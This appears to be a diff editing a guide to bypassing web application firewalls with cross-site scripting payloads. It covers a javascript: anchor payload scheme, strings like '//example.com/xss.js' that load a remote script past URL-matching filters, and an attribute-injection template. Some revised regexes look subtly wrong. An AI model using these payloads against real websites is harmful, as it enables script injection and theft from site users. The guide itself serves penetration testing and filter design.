@@ -125,7 +125,7 @@ Payloads using `<object>` tag can be crafted using a similar payload scheme:
 ##### Payload Scheme #3
 This payload scheme has two variants: plain and obfuscatable.
 
-The plain variant is often matched by patterns such as `href[\s]{0,}=[\s]{0,}javascript:`. Its structure is as follows:
+The plain variant is often matched by patterns such as `href[\s]*=[\s]*javascript:`. Its structure is as follows:
 
 `<A{filler}hReF{?filler}={?filler}JavaScript:{javascript}{?filler}{>,//,Space,Tab,LF}`
 
@@ -192,9 +192,9 @@ If the input is being reflected as the value of `src` attribute of a script or i
 
 ###### Bypassing URL Matching Regular Expressions
 
-- `//example.com/xss.js` bypasses `http(?s)://`
-- `////////example.com/xss.js` bypasses `(?:http(?s):?)?//`
-- `/\///\\/example.com/xss.js` bypasses `(?:http(?s):?)?//+`
+- `//example.com/xss.js` bypasses `http(s)?//`
+- `////////example.com/xss.js` bypasses `(http(s)?)?//`
+- `/\///\\/example.com/xss.js` bypasses `(http(s)?)?//+`
 
 
 ##### Inside 'srcdoc' Attribute
@@ -208,7 +208,7 @@ If the input is being reflected as the value of `srcdoc` attribute of an iframe 
 All the above cases do not require any bypassing techniques, except the last one which can be                                 bypassed using the techniques used in the HTML context section.
 The discussed cases are uncommon and the most common type of attribute context reflection is as follows:
 
-`<input type="text" value=""/onfocus="alert()$input">`
+`<input type="text" value="$input">`
 
 It can be further divided into two categories based on the interactivity of the concerned tag.
 
